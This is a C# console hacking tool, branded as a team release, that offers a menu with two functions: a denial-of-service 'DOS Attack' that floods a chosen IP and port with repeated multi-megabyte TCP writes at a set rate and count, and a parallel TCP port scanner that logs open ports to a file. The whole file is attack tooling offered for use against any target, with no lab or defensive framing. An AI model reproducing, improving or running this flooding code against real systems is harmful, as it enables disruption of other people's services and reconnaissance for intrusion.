using System;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;

class Program
{
    static void Main(string[] args)
    {
        Start();
    }


    public static void PortScan(string targetIp, int startPort, int endPort)
    {
        Console.WriteLine("Scanning ports...");

        List<int> openPorts = new List<int>();

        Parallel.For(startPort, endPort + 1, port =>
        {
            try
            {
                TcpClient client = new TcpClient(targetIp, port);
                lock (openPorts)
                {
                    openPorts.Add(port);
                }
                client.Close();
            }
            catch (SocketException ex)
            {
                // Ignore closed ports
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Port {port} is closed.");
            }
        });

        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("Open ports:");
        foreach (int port in openPorts)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"{targetIp}:{port}");
        }

        SaveOpenPortsToFile(openPorts, targetIp);
        Console.ReadLine();
        Start();
    }



    public static void DosAttack(string targetIp, int targetPort, int timeInterval, int pingCount, int pingSizeMB)
    {
        byte[] buffer = new byte[pingSizeMB * 1024 * 1024];

        for (int i = 0; i < pingCount; i++)
        {
            try
            {
                TcpClient client = new TcpClient(targetIp, targetPort);
                NetworkStream stream = client.GetStream();
                stream.Write(buffer, 0, buffer.Length);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"Ping {i + 1}/{pingCount} to {targetIp}:{targetPort} successful");
                client.Close();
            }
            catch (SocketException ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Ping {i + 1}/{pingCount} to {targetIp}:{targetPort} failed: {ex.Message}");
            }
            finally
            {
                Console.ForegroundColor = ConsoleColor.White;
            }

            Task.Delay(timeInterval).Wait();
        }
        Start();
    }


    private static void SaveOpenPortsToFile(List<int> openPorts, string targetIp)
    {
        string filePath = $"{targetIp}_ports.txt";
        using (StreamWriter writer = new StreamWriter(filePath))
        {
            foreach (int port in openPorts)
            {
                writer.WriteLine($"{targetIp}:{port}");
            }
        }
        Console.WriteLine($"Open ports saved to {filePath}");
    }

    public static void Start()
    {
        string title = "3rd Japanese | Team";
        for (int i = 0; i < title.Length; i++)
        {
            Console.Title = title.Substring(0, i + 1);
            Thread.Sleep(5);
        }
        Console.Clear();
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine(@"
___________.__                     .___               
\_   _____/|  | _____    ____    __| _/______   ____  
 |    __)  |  | \__  \  /    \  / __ |\_  __ \_/ __ \ 
 |     \   |  |__/ __ \|   |  \/ /_/ | |  | \/\  ___/ 
 \___  /   |____(____  /___|  /\____ | |__|    \___  >
     \/              \/     \/      \/             \/ 
                    Presented by.3J|T DarknessScarlet
");
        var helloflandre =
            "EN:Select 1 or 2 (1 for DOS Attack, 2 for port scan):"
            + Environment.NewLine
            + "JP:使用する機能を選択 (DOS Attack: 1、ポートスキャン: 2):";

        foreach (var character in helloflandre)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(character);
            Thread.Sleep(30);
        }
        Console.WriteLine();
        int mode = int.Parse(Console.ReadLine());

        if (mode == 1)
        {
            Console.Clear();
            Console.Write("IP: ");
            string targetIp = Console.ReadLine();

            Console.Write("Port: ");
            int targetPort = int.Parse(Console.ReadLine());

            Console.Write("Time interval pings (1000(1sec),100(0.1sec)): ");
            int timeInterval = int.Parse(Console.ReadLine());

            Console.Write("[*]Ping Count: ");
            int pingCount = int.Parse(Console.ReadLine());

            Console.Write("[*]Ping Size(1(1MB)): ");
            int pingSizeMB = int.Parse(Console.ReadLine());
            DosAttack(targetIp, targetPort, timeInterval, pingCount,pingSizeMB);
        }
        else if (mode == 2)
        {
            Console.Clear();
            Console.Write("Enter target IP address: ");
            string targetIp = Console.ReadLine();

            Console.Write("Enter start port: ");
            int startPort = int.Parse(Console.ReadLine());

            Console.Write("Enter end port: ");
            int endPort = int.Parse(Console.ReadLine());
            PortScan(targetIp, startPort, endPort);
        }
        else
        {
            Console.WriteLine("Invalid selected.");
        }
    }
}